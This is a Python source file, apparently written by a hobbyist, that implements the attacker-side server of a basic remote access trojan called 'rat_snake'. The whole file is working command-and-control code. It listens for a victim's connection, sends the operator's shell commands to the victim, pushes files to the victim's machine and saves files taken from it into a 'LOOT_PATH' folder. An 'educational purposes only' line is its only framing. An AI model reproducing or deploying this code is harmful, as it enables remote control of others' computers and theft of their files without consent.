# server software for my very basic python RAT
# server = run on attacker
# by cayden wright
# educational purposes only
# 3 January 2023

import os
import re
import socket

HOST = "0.0.0.0"  # IP to listen on
PORT = 1234  # port to listen on
ENCODING = 'utf-8'
LOOT_PATH = "C:\\Users\\minds\\Code\\malware_pentesting\\rat_snake\\"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    print("Waiting for a connection...")
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        client_working_directory = conn.recv(1024).decode(ENCODING)
        while True:
            # get command to run
            command = input(f"{client_working_directory}$>")

            # special case for uploading files - we need to do some processing here first
            # rat_snake upload filename
            if command[:16] == "rat_snake upload":
                filename = command[17:]
                if os.path.exists(filename):
                    # this line here might not work
                    file_size = os.path.getsize(filename)
                    safe_filename = re.sub(" ", "-", filename)
                    conn.sendall(f"special:recieve_upload {safe_filename} {file_size}".encode(ENCODING))
                    with open(filename, "rb") as file:
                        buffer = file.read(file_size)
                        conn.sendall(buffer)
                else:
                    print("file not found for upload.")
                    continue
            else:
                command = command.encode(ENCODING)
                conn.sendall(command)
                # get result
            recieved_output = conn.recv(1024).decode(ENCODING)
            print(recieved_output)
            # handle client stopped
            if recieved_output == "special:client_stopped":
                print("Client has been terminated.")
                exit()
            # handle file transfer
            elif recieved_output[:20] == "special:recieve_file":
                filename, file_size = recieved_output[21:].split(" ")
                with open(LOOT_PATH+filename, "wb") as file:
                    buffer = conn.recv(int(file_size))
                    file.write(buffer)
            # recieve client working directory
            client_working_directory = conn.recv(1024).decode(ENCODING)
